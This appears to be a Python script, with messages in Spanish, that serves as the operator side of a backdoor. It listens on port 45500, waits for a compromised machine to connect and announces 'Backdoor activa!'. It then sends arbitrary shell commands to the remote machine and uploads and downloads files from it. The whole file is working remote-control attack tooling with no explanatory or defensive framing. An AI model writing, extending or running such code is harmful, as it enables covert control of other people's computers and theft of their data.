from logger import console
import socket
import json
import os
from pathlib import Path

def send_file(conn, filename):
    console.log(f'enviando archivo {filename}')
    if not os.path.exists(filename):
        raise FileExistsError('El archivo que intentas subir no existe')
    conn.send(f'upload {filename.split('/')[-1]}'.encode())
    status = conn.recv(48).decode()
    console.debug(status)
    if status == 'ok':
        filesize = os.path.getsize(filename)
        conn.send(str(filesize).encode())

        with open(filename, 'rb') as f:
            while chunk := f.read(1024):
                conn.sendall(chunk)
            console.log('Se subio el archivo')

def download(conn, filename):
    status = conn.recv(1024).decode()
    if status == 'FileExistsError':
        console.err('El archivo "{filename}" no existe')
        return
    filesize = int(status)
    with open(filename, 'wb') as f:
        current_size = 0
        while True:
            data = conn.recv(1024)
            f.write(data)
            current_size += 1024
            if current_size >= filesize:
                break
        console.debug('Se guardo el archivo')


def listen():
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    servidor.bind(('0.0.0.0', 45500))
    servidor.listen(1)
    console.log('Esperando conexiones...')
    conn, addr = servidor.accept()
    console.log(f'Conectado desde {addr}')
    path = conn.recv(1024).decode()
    if path:
        console.log('Backdoor activa!')

    while True:
        cmd = console.input(f'{path}# ')
        if cmd == 'exit':
            break
        elif cmd[:2] == 'cd':
            conn.send(cmd.encode())
            dest_path = conn.recv(1024).decode()
            if dest_path != 'invalid':
                path = dest_path
                continue
            console.err(f'Directorio invalido: {dest_path}')
            continue
        elif cmd.split(' ')[0] == 'download':
            conn.send(cmd.encode())
            download(conn, cmd.split(' ')[1])
            continue
        elif cmd.split(' ')[0] == 'upload':
            try:
                send_file(conn, cmd.split(' ')[1])
            except FileExistsError as err:
                console.err(err)
            continue
        conn.send(cmd.encode())
        output = conn.recv(1024 * 10).decode()
        console.print(output)
    
    conn.close()



if __name__ == '__main__':
    listen()